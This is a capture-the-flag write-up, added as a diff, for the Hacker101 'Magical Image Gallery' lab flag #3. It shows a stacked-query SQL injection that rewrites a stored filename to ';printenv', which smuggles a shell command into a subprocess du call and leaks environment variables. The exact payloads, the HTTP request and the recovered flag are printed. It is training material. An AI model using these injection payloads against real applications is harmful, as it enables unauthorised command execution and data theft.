@@ -1,0 +1,73 @@
+================================
+LAB: Magical Image Gallery - Flag #3
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 6, 2026
+Lab URL: https://618a0a757b7277affb45517a31c06a98.ctf.hacker101.com/
+Category: Web Security - SQL Injection + Command Injection
+Level: Moderate
+Objective: Exploit stacked queries to inject commands via subprocess call
+Description: Combine SQLi with OS command injection through filename manipulation
+
+[RECONNAISSANCE]
+----------------
+From source code analysis (Flag #1), identified command injection vector at line 42:
+
+subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True)
+
+Filenames from photos table directly concatenated into shell command.
+Home page displays output in "Space used:" section.
+
+Challenge: Modify filename in database to inject malicious command.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Line 50 uses string formatting vulnerable to stacked queries:
+cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id'])
+
+MySQL allows multiple statements separated by semicolons when using % formatting.
+
+Tested stacked queries capability:
+Payload: /fetch?id=1; UPDATE photos SET filename='test' WHERE id=3; commit;
+
+Critical: commit; required to persist changes (MySQL doesn't auto-commit in transactions).
+
+[EXPLOITATION]
+--------------
+Step 1: Inject command via UPDATE
+Payload: /fetch?id=1; UPDATE photos SET filename=";printenv" WHERE id=3; commit;
+
+Breakdown:
+- id=1 → Execute normal SELECT
+- ; → Statement separator (stacked query)
+- UPDATE photos SET filename=";printenv" WHERE id=3 → Modify photo #3 filename
+- commit; → Persist changes to database
+
+Step 2: Trigger command execution
+Navigate to home page: https://618a0a757b7277affb45517a31c06a98.ctf.hacker101.com/
+
+Application executes: du -ch files/cat1.jpg files/cat2.jpg files/;printenv
+Shell interprets: du command, then executes printenv
+
+Step 3: Extract flag from output
+View page source, locate "Space used:" section containing environment variables.
+
+[EVIDENCE]
+----------
+Request:
+GET /fetch?id=1;%20UPDATE%20photos%20SET%20filename=%22;printenv%22%20WHERE%20id=3;%20commit; HTTP/2
+
+Home page output:
+<i>Space used: FLAGS=["^FLAG^eb7eed...","^FLAG^365f6e...","^FLAG^6635d8175a45fdfae90ae697fdaf8c085cd229645b1a13bf4881f2718d62baa0$FLAG$"]</i>
+
+Flag: 6635d8175a45fdfae90ae697fdaf8c085cd229645b1a13bf4881f2718d62baa0
+
+[LESSONS LEARNED]
+-----------------
+1. Stacked queries enable chaining SELECT with INSERT/UPDATE/DELETE statements
+2. MySQL requires explicit commit; to persist transaction changes
+3. Shell injection via subprocess with user-controlled data is critical vulnerability
+4. Command output can leak through unexpected channels (disk usage display)
+5. Environment variables common storage for CTF flags in containerized apps
